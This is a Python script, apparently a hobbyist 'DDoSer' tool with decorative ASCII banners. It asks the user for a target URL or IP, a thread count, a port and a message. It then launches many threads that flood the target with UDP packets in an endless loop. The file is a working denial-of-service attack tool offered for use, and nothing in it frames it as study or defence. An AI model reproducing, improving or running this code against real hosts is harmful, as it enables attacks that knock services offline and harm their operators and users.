import sys
import os
import time
import socket
import random
from colorama import Fore, Back, Style
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
# Import modules
import os
import sys
import argparse
from colorama import Fore
import threading
import random
import time
import socket
import sys
import requests 
import socks
import random
import socket
import threading
import time
import os,sys
import ssl
os.system("clear")
method = "HTTP"
print("""\033[31m
      ░░░░░░░░░░▀▀▀██████▄▄▄░░░░░░░░░░
      ░░░░░░░░░░░░░░░░░▀▀▀████▄░░░░░░░
      ░░░░░░░░░░▄███████▀░░░▀███▄░░░░░
      ░░░░░░░░▄███████▀░░░░░░░▀███▄░░░
      ░░░░░░▄████████░░░░░░░░░░░███▄░░
      ░░░░░██████████▄░░░░░░░░░░░███▌░
      ░░░░░▀█████▀░▀███▄░░░░░░░░░▐███░
      ░░░░░░░▀█▀░░░░░▀███▄░░░░░░░▐███░
      ░░░░░░░░░░░░░░░░░▀███▄░░░░░███▌░
      ░░░░▄██▄░░░░░░░░░░░▀███▄░░▐███░░
      ░░▄██████▄░░░░░░░░░░░▀███▄███░░░
      ░█████▀▀████▄▄░░░░░░░░▄█████░░░░
      ░████▀░░░▀▀█████▄▄▄▄█████████▄░░
      ░░▀▀░░░░░░░░░▀▀██████▀▀░░░▀▀██░░ 
        
           \033[36mРазнеси всех и вся 💥
""")
time.sleep(2)


import time,socket,sys,os,_thread

#=================================================================================================

#color
class color:
    red = '\033[91m'
    sabz = '\033[92m'
    sefid = '\033[0m'
    narenji = '\033[93m'
    abi_kamrang = '\033[94m'

#=================================================================================================
if os.name == 'nt':
    os.system("color A")

print('')
print("############################################################################")
print("#      @#%$             @#%$             $#^%            ^%&*              #") 
print("#      $#  %$           $#  %$        ^%     ^%        *#                  #")
print("#      %$   %$          %$   %$       %$     !@        ^%                  #")
print("#      %$    %$         %$    %$      &^     ^%        $%                  #")
print("#      ^%    @#         ^%    @#      %$     ^%         ^%                 #")
print("#      $3   $%          $3   $%       @#     &^            &^              #")
print("#      %$  $%           &$  $%        #^    ^%              &%             #")
print("#      %$%$             %$%$            $#^%            #$$&       Neutron #")
print("############################################################################")
print('')
print(color.sefid+'------------------------------------------------------------')
print('')
print(color.narenji+'    Step 1.  Enter url or ip')
print(color.narenji+'    Step 2.  Enter power attack')
print(color.narenji+'    Step 3.  Enter message attack ')
print(color.narenji+'    Step 3.  Start DDoser !!!')
print('')
print(color.sefid+'------------------------------------------------------------')
print('')
print('')

#=================================================================================================

ior = input('  DDOS attack boy ip or url ?  ')
ioru = ior.lower()
print('')
print('')
if ioru == ('url'):
    site = input(color.sabz+"      Enter target site url => ")
    print('')
    ip = socket.gethostbyname(site)
    print('')
#=================================================================================================

if ioru == ('ip'):
    print('')
    print('')
    ip = input(str('   Enter target ip => '))
    print('')

#=================================================================================================

print("     your target IP:  ", ip)
print('')
thread_count = input(color.red+" Enter power attack => ")
print('')
port = input("   Enter target port =>   ")
print('')
UDP_PORT = int(port)
MESSAGE = input(color.abi_kamrang+'      Enter message =>  ')
print(color.sefid+'------------------------------------------------------------')
time.sleep(2)
print("")
print(color.red+" [       ] 0%")
time.sleep(1)
print(color.abi_kamrang+" [=======   ] 20%")
time.sleep(0.5)
print(color.abi_kamrang+" [============ ] 40%")
time.sleep(0.4)
print(color.abi_kamrang+" [================ ] 60%")
time.sleep(0.5)
print(color.abi_kamrang+" [==================== ] 80%")
time.sleep(0.6)
print(color.abi_kamrang+" [========================= ] 100%")
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')

print('''starting...''')
print('')
print(color.sefid+'------------------------------------------------------------')
print(color.sabz+"UDP target IP: ", ip)
print(color.sabz+"UDP target port: ", UDP_PORT)
time.sleep(3)

#==========================================START=DDOS=======================================================

def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(color.sabz+" DDos ataack !!! ")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
